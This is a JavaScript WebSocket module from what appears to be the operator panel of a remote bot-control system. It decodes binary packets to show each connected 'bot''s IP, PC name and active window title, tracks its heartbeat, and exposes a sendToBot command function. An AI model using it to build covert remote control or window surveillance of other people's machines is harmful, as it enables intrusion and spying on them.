/* frontend/client_control/js/modules/websocket/connection.js */
import { AppState } from '../core/states.js';

let socket = null, botWatchdog = null;

const updateUI = (id, val) => {
    const el = document.getElementById(id);
    if (el && val) el.textContent = val;
};

const setOnline = (isOnline) => {
    const dot = document.getElementById('status-indicator');
    const txt = document.getElementById('status-text');
    dot?.classList.toggle('online', isOnline);
    if (txt) txt.textContent = isOnline ? 'online' : 'offline';
};

function handleIncomingData(buffer) {
    try {
        const view = new DataView(buffer);
        const dec = new TextDecoder();

        const idLen = view.getUint8(0);
        const incomingId = dec.decode(new Uint8Array(buffer, 1, idLen));
        if (incomingId !== AppState.clientId) return;

        const modLen = view.getUint8(1 + idLen);
        const payOff = 6 + idLen + modLen;
        const payLen = view.getUint32(2 + idLen + modLen, false);
        const data = JSON.parse(dec.decode(new Uint8Array(buffer, payOff, payLen)));

        // 1. Метаданные из БД или активное окно
        updateUI('bot-ip-display', data.ip);
        updateUI('bot-pc-display', data.pc_name);
        updateUI('bot-id-display', data.id);
        updateUI('bot-window-display', data.activeWindow);

        // 2. Живой Heartbeat
        if (data.net === "heartbeat") {
            setOnline(true);
            clearTimeout(botWatchdog);
            botWatchdog = setTimeout(() => setOnline(false), 5000);
        }
    } catch (e) { console.error("[WS] Parse error", e); }
}

export function initControlConnection() {
    const token = localStorage.getItem('auth_token'), login = localStorage.getItem('user_login');
    if (!token || !login) return;

    const prot = location.protocol === 'https:' ? 'wss:' : 'ws:';
    socket = new WebSocket(`${prot}//${location.host}/ws?token=${token}&login=${login}`);
    socket.binaryType = 'arraybuffer';

    socket.onmessage = (e) => (e.data instanceof ArrayBuffer) && handleIncomingData(e.data);
    socket.onopen = () => console.log("[WS] Connected");
    socket.onclose = () => { setOnline(false); clearTimeout(botWatchdog); };

    window.sendToBot = (mod, pay) => {
        if (socket?.readyState === 1) {
            import('./sender.js').then(m => socket.send(m.encodePacket(AppState.clientId, mod, pay)));
        }
    };
}